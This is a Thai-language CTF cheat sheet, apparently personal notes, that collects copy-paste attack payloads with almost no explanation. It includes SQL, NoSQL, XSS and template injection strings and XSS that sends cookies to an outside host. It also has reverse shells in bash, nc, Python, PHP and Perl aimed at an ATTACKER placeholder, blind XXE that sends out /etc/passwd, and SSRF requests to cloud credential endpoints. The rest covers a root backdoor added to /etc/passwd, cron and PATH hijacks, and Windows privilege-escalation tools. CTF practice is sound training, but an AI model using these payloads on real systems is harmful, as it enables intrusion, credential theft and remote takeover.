---
tags: [ctf, cheatsheet, quick-reference]
created: 2026-05-01
---

# 🚀 Quick Reference: Payload สำเร็จรูปสำหรับแข่ง

> หน้านี้สำหรับใช้ตอนแข่งจริง: copy-paste แล้วยิงได้เลย ไม่ต้องอ่านอธิบาย

---

## 🌐 Web

### SQL Injection: Auth Bypass
```sql
admin' --
admin' #
admin'/*
admin' OR '1'='1' --
admin' OR 1=1 --
' OR '1'='1' --
' OR 1=1 LIMIT 1 --
admin'--
admin' OR 1=1 LIMIT 1#
') OR ('1'='1
') OR 1=1--
"-"
"="
"or 1=1 --"
```

### SQL Injection: UNION (MySQL)
```sql
' ORDER BY 1-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT version(),@@hostname,user()-- -
' UNION SELECT 1, table_name, 3 FROM information_schema.tables-- -
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1, group_concat(username,':',password), 3 FROM users-- -
```

### SQL Injection: Blind (Time)
```sql
' AND IF(1=1, SLEEP(5), 0)-- -
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '00:00:05'-- -
```

### NoSQL Injection
```
{"username": {"$ne": null}, "password": {"$ne": null}}
?username[$ne]=null&password[$ne]=null
?username[$regex]=^a&password[$ne]=
```

### XSS: Basic
```html
<script>alert(1)</script>

<svg onload=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
">
javascript:alert(1)
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

### XSS: Cookie Steal
```html
<script>fetch('https://wh.site/?c='+document.cookie)</script>
<img src=x onerror="this.src='https://wh.site/?c='+document.cookie">
```

### XSS: Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Command Injection
```
; id
| id
& id
&& id
|| id
`id`
$(id)
%0Aid

# Reverse shell
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

### Reverse Shell
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196

# nc (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Listener (เครื่องเรา)
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

### Stabilize Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter twice
export TERM=xterm
```

### LFI
```
?file=/etc/passwd
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=../config.php
?file=data://text/plain,<?php system($_GET[c]); ?>&c=id
?file=expect://id
?file=/proc/self/environ
?file=/var/log/apache2/access.log
?file=/var/log/nginx/access.log
?file=zip://shell.zip%23shell.php
```

### LFI Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
data://text/plain,<?php phpinfo(); ?>
data://text/plain;base64,<base64 ของ PHP code>
phar://uploaded.phar
zip://upload.zip#file
```

### SSRF
```
http://localhost/admin
http://127.0.0.1/
http://[: 1]/
http://0.0.0.0/
http://127.1/
http://2130706433/
http://0x7f000001/

# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Bypass filter
http://expected@evil.com/
http://expected#@evil.com/
http://evil.com#@expected/
```

### XXE: Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### XXE: Read PHP source
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>&xxe;</root>
```

### XXE: Blind OOB
```xml
<!-- evil.dtd บน attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<r>x</r>
```

### SSTI: Jinja2 RCE
```
{{7*7}}
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()[0]}}
```

### SSTI: Twig
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### SSTI: ERB
```
<%= `id` %>
<%= system("id") %>
```

### SSTI: Velocity / FreeMarker
```
${"freemarker.template.utility.Execute"?new()("id")}
#set($e="exp"); $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### CRLF Injection
```
%0d%0aSet-Cookie: admin=1
%0d%0aLocation: https://evil.com
%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Open Redirect
```
?next=//evil.com
?redirect=https://evil.com
?url=//evil.com
?url=evil.com
?url=/\evil.com
?next=https://target.com.evil.com
```

### CSRF
```html
<form action="https://target.com/action" method="POST">
  <input name="x" value="y">
</form>
<script>document.forms[0].submit()</script>
```

### JWT: alg:none
```python
import base64, json
h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
p = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin"}').rstrip(b'=')
print((h + b'.' + p + b'.').decode())
```

### JWT: Crack secret
```bash
hashcat -m 16500 jwt.txt rockyou.txt
python3 jwt_tool.py <token> -C -d wordlists.txt
```

---

## 🔍 Recon

### nmap fast
```bash
nmap -sV -sC --top-ports 1000 target
nmap -p- -T4 --min-rate=1000 target
nmap -sV -sC -p $(masscan -p1-65535 target --rate=10000 | grep open | awk '{print $4}' | cut -d/ -f1 | tr '\n' ',') target
```

### Web fuzz
```bash
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
ffuf -u http://target -H "Host: FUZZ.target" -w subdomains.txt -fs <baseline>
gobuster dir -u http://target -w wordlist.txt -x php,html,txt,bak
```

### Subdomain
```bash
subfinder -d target.com -all
amass enum -passive -d target.com
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Sensitive files
```
/robots.txt
/sitemap.xml
/.git/config
/.env
/admin
/login
/backup.zip
/.htaccess
/phpinfo.php
/api/swagger.json
/.well-known/security.txt
```

---

## 🔐 Crypto

### Identify hash
```bash
hash-identifier
hashid <hash>
```

### Crack hash
```bash
# MD5
hashcat -m 0 -a 0 hash.txt rockyou.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# bcrypt
hashcat -m 3200 -a 0 hash.txt rockyou.txt

# JWT
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# WPA
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt

# Mask
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?d?d
```

### Base detection (regex)
```
Base64:  [A-Za-z0-9+/=]+
Base32:  [A-Z2-7=]+
Hex:     [0-9a-fA-F]+
Base58:  [1-9A-HJ-NP-Za-km-z]+
```

### CyberChef recipes
- Magic: auto-detect
- "From Base64" + "From Hex"
- "ROT13" + "ROT47" + "Bruteforce Caesar"
- "Vigenere Decode"
- "From Morse Code"

### RSA quick
```bash
# Auto-attack
python3 RsaCtfTool.py -n <n> -e <e> --uncipher <c>

# Parse pub key
openssl rsa -pubin -in pub.pem -text -noout

# Factor lookup
curl "http://factordb.com/api?query=<n>"
```

### XOR brute (single-byte)
```python
ct = bytes.fromhex("...")
for k in range(256):
    pt = bytes(c ^ k for c in ct)
    if all(32 <= b < 127 for b in pt):
        print(k, pt)
```

---

## 🐧 Linux Privilege Escalation

### Enumeration
```bash
# Tools
linpeas.sh
linenum.sh
pspy64

# Manual
sudo -l
find / -perm -u=s 2>/dev/null              # SUID
find / -perm -g=s 2>/dev/null               # SGID
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*
ps aux
ss -tnlp
uname -a
cat /etc/os-release
id
groups
history
cat ~/.bash_history
env
```

### Common escalation
```bash
# sudo without password
sudo -l                       # ดู allowed commands

# GTFOBins ⭐: gtfobins.github.io
sudo find / -exec sh -i \;
sudo vim -c ':!sh'
sudo less /etc/profile        # !sh
sudo nmap --interactive       # !sh

# SUID binary
./suid_binary                 # ดู GTFOBins สำหรับ binary นั้น

# Cron job แก้ได้
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" >> /etc/cron-job.sh

# /etc/passwd writable
echo 'hacker:$1$abc$DkNYdLpMP4mJlqAj7xFi9.:0:0: /root:/bin/bash' >> /etc/passwd
# password = pass

# PATH hijack
echo '#!/bin/bash' > /tmp/ls
echo 'bash -i' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

### Capabilities
```bash
getcap -r / 2>/dev/null

# Common dangerous caps
# python3 with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX: setuid(0); exec "/bin/sh";'
```

### Kernel exploit
```bash
uname -a
# searchsploit kernel x.x.x
# Dirty Cow, Dirty Pipe, Pwnkit, etc.
```

### GTFOBins lookup
**gtfobins.github.io** ⭐: สำหรับทุก SUID binary

---

## 🪟 Windows Privilege Escalation

### Enumeration
```powershell
# Tools
.\winPEAS.exe
.\Sherlock.ps1
.\Watson.exe

# Manual
whoami /priv
whoami /groups
systeminfo
net users
net localgroup administrators
wmic qfe get HotFixID,InstalledOn
Get-ChildItem -Path C:\ -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Mode -match "d" -and ($_.GetAccessControl().Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.FileSystemRights -match "Write" }) }
```

### Common escalation
```powershell
# Token impersonation (ถ้า SeImpersonate)
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd"
.\JuicyPotato.exe -t * -p cmd.exe

# Stored credentials
cmdkey /list
runas /savecred /user:admin cmd

# Service misconfig
sc qc <service>
.\AccessChk.exe -uwcqv "Authenticated Users" *
```

---

## 🛠 Useful one-liners

### File transfer
```bash
# Server (เครื่องเรา)
python3 -m http.server 8000

# Target download
wget http://ATTACKER:8000/file
curl -O http://ATTACKER:8000/file

# Windows download
powershell -c "iwr http://ATTACKER:8000/file -OutFile file.exe"
certutil -urlcache -f http://ATTACKER:8000/file file
```

### URL decode/encode
```bash
echo 'hello world' | jq -sRr @uri          # encode
echo 'hello%20world' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))"
```

### Base64
```bash
echo "text" | base64
echo "dGV4dAo=" | base64 -d
```

---

## 📚 References

- [Tools-Cheatsheet](Tools-Cheatsheet.md)
- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: book.hacktricks.xyz
- GTFOBins: gtfobins.github.io
- LOLBAS (Windows): lolbas-project.github.io
- revshells.com: Reverse shell generator

---

#ctf #cheatsheet #quick-reference
